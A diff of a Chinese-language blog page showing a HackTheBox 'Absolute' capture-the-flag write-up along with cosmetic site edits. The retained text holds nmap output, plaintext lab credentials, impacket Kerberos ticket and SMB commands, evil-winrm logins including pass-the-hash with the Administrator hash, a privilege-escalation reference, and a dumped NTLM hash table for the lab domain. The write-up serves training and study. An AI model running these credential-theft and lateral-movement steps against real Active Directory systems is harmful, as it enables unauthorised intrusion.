@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;498  10.10.11.181                                                                                                              端口扫描80和其他常规域端口： 123">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;498  10.10.11.181   端口扫描80和其他常规域端口： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455$ nmap -s">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Absolute - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2022/09/27/Absolute-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;498  10.10.11.181                                                                                                              端口扫描80和其他常规域端口： 123">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;498  10.10.11.181   端口扫描80和其他常规域端口： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455$ nmap -s">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022122701.jpg">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022122702.jpg">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022122703.jpg">
@@ -115,8 +115,15 @@
             </li>
         
             <li class="waves-block waves-effect">
+              <a href="https://www.buymeacoffee.com/darkwing_nya" target="_blank" >
+                <i class="icon icon-lg icon-coffee"></i>
+                Buy me a coffe
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link"></i>
+                <i class="icon icon-lg icon-link2"></i>
                 About
               </a>
             </li>
@@ -138,7 +145,7 @@
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                 <i class="icon icon-lg icon-chevron-left"></i>
             </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                 <i class="icon icon-lg icon-search"></i>
             </a>
@@ -206,28 +213,14 @@
 </li>
 <li><h2 id="10-10-11-181"><a href="#10-10-11-181" class="headerlink" title="10.10.11.181"></a>10.10.11.181</h2></li>
 </ul>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122701.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122701.jpg" alt=""></p>
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>80和其他常规域端口：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV -Pn 10.10.11.181</span></span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-27 13:53 CST</span><br><span class="line">Nmap scan report for 10.10.11.181</span><br><span class="line">Host is up (0.19s latency).</span><br><span class="line">Not shown: 988 closed tcp ports (conn-refused)</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">53/tcp   open  domain        Simple DNS Plus</span><br><span class="line">80/tcp   open  http          Microsoft IIS httpd 10.0</span><br><span class="line">|_http-title: Absolute</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-12-27 12:54:19Z)</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-date: 2022-12-27T12:55:14+00:00; +7h00m00s from scanner time.</span><br><span class="line">| ssl-cert: Subject: commonName=dc.absolute.htb</span><br><span class="line">| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.absolute.htb</span><br><span class="line">| Not valid before: 2022-06-09T08:14:24</span><br><span class="line">|_Not valid after:  2023-06-09T08:14:24</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: commonName=dc.absolute.htb</span><br><span class="line">| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.absolute.htb</span><br><span class="line">| Not valid before: 2022-06-09T08:14:24</span><br><span class="line">|_Not valid after:  2023-06-09T08:14:24</span><br><span class="line">|_ssl-date: 2022-12-27T12:55:12+00:00; +7h00m01s from scanner time.</span><br><span class="line">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-date: 2022-12-27T12:55:14+00:00; +7h00m00s from scanner time.</span><br><span class="line">| ssl-cert: Subject: commonName=dc.absolute.htb</span><br><span class="line">| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.absolute.htb</span><br><span class="line">| Not valid before: 2022-06-09T08:14:24</span><br><span class="line">|_Not valid after:  2023-06-09T08:14:24</span><br><span class="line">3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: commonName=dc.absolute.htb</span><br><span class="line">| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.absolute.htb</span><br><span class="line">| Not valid before: 2022-06-09T08:14:24</span><br><span class="line">|_Not valid after:  2023-06-09T08:14:24</span><br><span class="line">|_ssl-date: 2022-12-27T12:55:12+00:00; +7h00m01s from scanner time.</span><br><span class="line">Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2022-12-27T12:55:05</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   311:</span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 6h59m59s</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 109.34 seconds</span><br></pre></td></tr></table></figure>
 
 
 
 <h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>没什么东西：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122702.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122702.jpg" alt=""></p>
 <p>图片exif里可以得到一些用户名：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">James Roberts</span><br><span class="line">Michael Chaffrey</span><br><span class="line">Donald Klay</span><br><span class="line">Sarah Osvald</span><br><span class="line">Jeffer Robinson</span><br></pre></td></tr></table></figure>
 
@@ -251,14 +244,7 @@
 <h1 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h1><p>smb账户获取票据后可以访问smb：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">impacket-getTGT 'absolute.htb/svc_smb:AbsoluteSMBService123!'</span><br><span class="line">export KRB5CCNAME=svc_smb.ccache</span><br><span class="line">impacket-smbclient svc_smb@dc.absolute.htb -k -no-pass</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122703.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122703.jpg" alt=""></p>
 <h2 id="test-exe"><a href="#test-exe" class="headerlink" title="test.exe"></a>test.exe</h2><p>获取 test.exe 文件并在连接了 vpn 的 Windows 机器上运行它。然后运行wireshark抓取请求(首先是有一些dns请求，更新hosts后能够看到LDAP请求，并且得到的用户名格式需要自己根据前面的改一下)，见如下抓取信息。找到新凭证</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">absolute.htb\m.lovegod:AbsoluteLDAP2022!</span><br></pre></td></tr></table></figure>
 
@@ -307,14 +293,7 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=winrm_user_ccache</span><br><span class="line">ntpdate -s absolute.htb &amp;&amp; evil-winrm -i DC.ABSOLUTE.HTB -r ABSOLUTE.HTB</span><br></pre></td></tr></table></figure>
 
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>winrm_user桌面得到user flag:</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122704.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122704.jpg" alt=""></p>
 <h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><ul>
 <li>No-Fix Local Privilege Escalation Using KrbRelay With Shadow Credentials | Icyguider’s Blog<br><a href="https://icyguider.github.io/2022/05/19/NoFix-LPE-Using-KrbRelay-With-Shadow-Credentials.html" target="_blank" rel="noopener">https://icyguider.github.io/2022/05/19/NoFix-LPE-Using-KrbRelay-With-Shadow-Credentials.html</a></li>
 </ul>
@@ -338,14 +317,7 @@
 <h1 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h1><p>得到Administrator hash，PTH：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.11.181 -u Administrator -H 1f4a6093623653f6488d5aa24c75f2ea</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122705.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122705.jpg" alt=""></p>
 <h2 id="hash"><a href="#hash" class="headerlink" title="hash"></a>hash</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Administrator\Administrator:500:aad3b435b51404eeaad3b435b51404ee:1f4a6093623653f6488d5aa24c75f2ea:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3ca378b063b18294fa5122c66c2280d4:::</span><br><span class="line">J.Roberts:1103:aad3b435b51404eeaad3b435b51404ee:7d6b7511772593b6d0a3d2de4630025a:::</span><br><span class="line">M.Chaffrey:1104:aad3b435b51404eeaad3b435b51404ee:13a699bfad06afb35fa0856f69632184:::</span><br><span class="line">D.Klay:1105:aad3b435b51404eeaad3b435b51404ee:21c95f594a80bf53afc78114f98fd3ab:::</span><br><span class="line">s.osvald:1106:aad3b435b51404eeaad3b435b51404ee:ab14438de333bf5a5283004f660879ee:::</span><br><span class="line">j.robinson:1107:aad3b435b51404eeaad3b435b51404ee:0c8cb4f338183e9e67bbc98231a8e59f:::</span><br><span class="line">n.smith:1108:aad3b435b51404eeaad3b435b51404ee:ef424db18e1ae6ba889fb12e8277797d:::</span><br><span class="line">m.lovegod:1109:aad3b435b51404eeaad3b435b51404ee:a22f2835442b3c4cbf5f24855d5e5c3d:::</span><br><span class="line">l.moore:1110:aad3b435b51404eeaad3b435b51404ee:0d4c6dccbfacbff5f8b4b31f57c528ba:::</span><br><span class="line">c.colt:1111:aad3b435b51404eeaad3b435b51404ee:fcad808a20e73e68ea6f55b268b48fe4:::</span><br><span class="line">s.johnson:1112:aad3b435b51404eeaad3b435b51404ee:b922d77d7412d1d616db10b5017f395c:::</span><br><span class="line">d.lemm:1113:aad3b435b51404eeaad3b435b51404ee:e16f7ab64d81a4f6fe47ca7c21d1ea40:::</span><br><span class="line">svc_smb:1114:aad3b435b51404eeaad3b435b51404ee:c31e33babe4acee96481ff56c2449167:::</span><br><span class="line">svc_audit:1115:aad3b435b51404eeaad3b435b51404ee:846196aab3f1323cbcc1d8c57f79a103:::</span><br><span class="line">winrm_user:1116:aad3b435b51404eeaad3b435b51404ee:8738c7413a5da3bc1d083efc0ab06cb2:::</span><br><span class="line">DC$:1000:aad3b435b51404eeaad3b435b51404ee:a7864ab463177acb9aec553f18f42577:::</span><br></pre></td></tr></table></figure>
 
 
@@ -369,7 +341,7 @@
     <div class="content">
         
 <span class="post-time">
-    最后更新时间：<time datetime="2023-05-29T00:50:25.693Z" itemprop="dateUpdated">2023-05-29 08:50:25</time>
+    Last updated: <time datetime="2023-05-29T00:50:25.693Z" itemprop="dateUpdated">2023-05-29 08:50:25</time>
 </span><br>
 
 
@@ -536,11 +508,11 @@
             
                 <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
             
-            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
         </p>
     </div>
     <div class="bottom">
-        <p><span>暗羽 &copy; 2014 - 2023</span>
+        <p><span>暗羽 &copy; 2014 - 2024</span>
             <span>
                 
                 Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
